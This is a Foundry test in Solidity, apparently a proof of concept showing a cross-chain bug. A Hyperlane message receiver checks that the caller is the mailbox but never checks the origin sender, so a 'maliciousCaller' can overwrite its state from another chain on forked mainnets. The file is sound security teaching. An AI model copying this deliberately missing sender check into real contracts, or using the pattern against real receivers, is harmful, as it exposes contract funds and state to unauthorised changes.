// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "pigeon/hyperlane/HyperlaneHelper.sol";

interface IMailbox {
    function dispatch(uint32 _destinationDomain, bytes32 _recipientAddress, bytes calldata _messageBody)
        external
        returns (bytes32);
}

contract VulnerableContract {
    uint256 public value;
    IMailbox public constant mailbox = IMailbox(0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70);

    /// @dev this contract is vulnerable here, it don't validate the sender
    function handle(uint32, bytes32, bytes calldata _message) external {
        require(msg.sender == address(mailbox));
        value = abi.decode(_message, (uint256));
    }
}

contract CrossChainBugPoc is Test {
    HyperlaneHelper public hyperlaneHelper;
    VulnerableContract public vulnerableContract;

    address usualCaller = address(42);
    address maliciousCaller = address(420);

    uint256 public L1_FORK_ID;
    uint256 public L2_FORK_ID;

    uint32 constant L1_DOMAIN = 1;
    uint32 constant L2_DOMAIN = 137;

    address public constant L1_HLMailbox = 0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70;
    address public constant L2_HLMailbox = 0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70;

    function setUp() public {
        L2_FORK_ID = vm.createFork("https://polygon-rpc.com");
        vulnerableContract = new VulnerableContract();

        L1_FORK_ID = vm.createSelectFork("https://eth.llamarpc.com");
        hyperlaneHelper = new HyperlaneHelper();
    }

    function testInvalidSenderAttack() public {
        // Record logs on the source chain
        vm.recordLogs();

        vm.prank(usualCaller);
        IMailbox(L1_HLMailbox).dispatch(
            L2_DOMAIN, bytes32(uint256(uint160(address(vulnerableContract)))), abi.encode(uint256(100_000_000))
        );

        // Simulate the first cross-chain message transfer
        hyperlaneHelper.help(L1_HLMailbox, L2_HLMailbox, L2_FORK_ID, vm.getRecordedLogs());

        // Check the state on the destination chain
        vm.selectFork(L2_FORK_ID);
        assertEq(VulnerableContract(vulnerableContract).value(), 100_000_000);

        vm.selectFork(L1_FORK_ID);
        // Now a hacker tries to set the value to zero again
        vm.recordLogs();
        vm.prank(maliciousCaller);
        IMailbox(L1_HLMailbox).dispatch(
            L2_DOMAIN, bytes32(uint256(uint160(address(vulnerableContract)))), abi.encode(uint256(0))
        );

        // Simulate the first cross-chain message transfer
        hyperlaneHelper.help(L1_HLMailbox, L2_HLMailbox, L2_FORK_ID, vm.getRecordedLogs());

        // Check the state on the destination chain
        vm.selectFork(L2_FORK_ID);
        assertEq(VulnerableContract(vulnerableContract).value(), 0);
    }
}
